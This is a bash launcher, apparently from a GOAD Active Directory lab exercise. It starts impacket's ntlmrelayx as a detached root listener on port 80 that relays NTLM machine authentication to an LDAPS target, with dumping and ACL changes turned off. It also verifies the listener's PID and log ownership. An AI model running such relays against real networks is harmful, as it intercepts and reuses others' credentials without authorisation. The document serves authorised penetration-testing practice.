#!/usr/bin/env bash
# Start a mutation-disabled HTTP -> LDAPS relay for deterministic WS01 machine authentication.
# Keep evidence user-owned while detaching the privileged relay with setsid.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
WORK="${WORK:-$HOME/.config/kingdoms/phase03-http-ldaps}"
LOG="$WORK/ntlmrelayx.log"
PIDFILE="$WORK/ntlmrelayx.pid"
FIFO="$WORK/ntlmrelayx.stdin"
RUNTIME="$ROOT/scripts/phase03/run-with-open-stdin.sh"

find_ntlmrelayx() {
  local c
  for c in     "$(command -v impacket-ntlmrelayx 2>/dev/null || true)"     "$(command -v ntlmrelayx.py 2>/dev/null || true)"     /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -f "$c" || -x "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

listener_pid_80() {
  sudo ss -H -lntp 'sport = :80' 2>/dev/null     | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p'     | head -n1
}

pid_cmdline() {
  local pid="$1"
  sudo sh -c "tr '\\0' ' ' < /proc/$pid/cmdline" 2>/dev/null || true
}

show_log() {
  if [[ -r "$LOG" ]]; then
    cat "$LOG" >&2
  elif [[ -e "$LOG" ]]; then
    sudo cat "$LOG" >&2 || true
  fi
}

cd "$ROOT"

bash "$ROOT/scripts/phase03/assert-wpad-exercise-clean.sh"

bash "$ROOT/scripts/phase03/check-http-ldaps-readonly-relay.sh"

NTLMRELAYX="$(find_ntlmrelayx)"
[[ -x "$RUNTIME" ]] || { echo "FAIL: runtime stdin helper not executable: $RUNTIME" >&2; exit 1; }
command -v setsid >/dev/null 2>&1 || { echo 'FAIL: setsid not found' >&2; exit 1; }

sudo -v
umask 077

rm -rf -- "$WORK"
mkdir -p "$WORK"

# Create all retained evidence as the unprivileged operator before starting
# the privileged listener. Root writes through already-open file descriptors;
# file ownership therefore remains with the operator.
: >"$LOG"
chmod 600 "$LOG"

# setsid -f detaches the runtime. The FIFO helper replaces /dev/null as
# ntlmrelayx stdin so sys.stdin.read() cannot receive an immediate EOF.
sudo -n setsid -f "$RUNTIME" "$FIFO" \
  stdbuf -oL -eL "$NTLMRELAYX" \
  -t "ldaps://$TARGET" \
  --no-dump \
  --no-da \
  --no-acl \
  --no-smb-server \
  --no-wcf-server \
  --no-raw-server \
  </dev/null >>"$LOG" 2>&1

REAL_PID=""
for _ in {1..30}; do
  REAL_PID="$(listener_pid_80 || true)"

  if [[ -n "$REAL_PID" ]]; then
    CMDLINE="$(pid_cmdline "$REAL_PID")"

    if grep -Eqi 'ntlmrelayx' <<<"$CMDLINE"; then
      break
    fi

    REAL_PID=""
  fi

  sleep 0.5
done

if [[ -z "$REAL_PID" ]]; then
  echo 'FAIL: could not identify the ntlmrelayx process owning TCP/80' >&2
  show_log
  exit 1
fi

CMDLINE="$(pid_cmdline "$REAL_PID")"
grep -Eqi 'ntlmrelayx' <<<"$CMDLINE" || {
  echo "FAIL: TCP/80 PID $REAL_PID is not ntlmrelayx: $CMDLINE" >&2
  exit 1
}

sudo kill -0 "$REAL_PID" 2>/dev/null || {
  echo "FAIL: ntlmrelayx listener PID $REAL_PID is not alive" >&2
  show_log
  exit 1
}

printf '%s\n' "$REAL_PID" >"$PIDFILE"
chmod 600 "$PIDFILE"

# Ensure this is not a transient listener that disappears when the launcher
# finishes.
for second in 1 2 3 4 5; do
  sleep 1
  CHECK_PID="$(listener_pid_80 || true)"

  if [[ "$CHECK_PID" != "$REAL_PID" ]]; then
    echo "FAIL: ntlmrelayx listener did not survive detached startup at t=${second}s" >&2
    show_log
    exit 1
  fi
done

LOG_OWNER="$(stat -Lc '%U' "$LOG")"
LOG_MODE="$(stat -Lc '%a' "$LOG")"

[[ "$LOG_OWNER" == "$(id -un)" ]] || {
  echo "FAIL: relay log owner is $LOG_OWNER, expected $(id -un)" >&2
  exit 1
}

[[ "$LOG_MODE" == "600" ]] || {
  echo "FAIL: relay log mode is $LOG_MODE, expected 600" >&2
  exit 1
}

echo "TARGET=ldaps://$TARGET"
echo "LOG=$LOG"
echo "LOG_OWNER=$LOG_OWNER"
echo "LOG_MODE=$LOG_MODE"
echo "PID=$REAL_PID"
echo "CMDLINE=$CMDLINE"
echo 'PHASE03_HTTP_LDAPS_RUNTIME_READY=True'
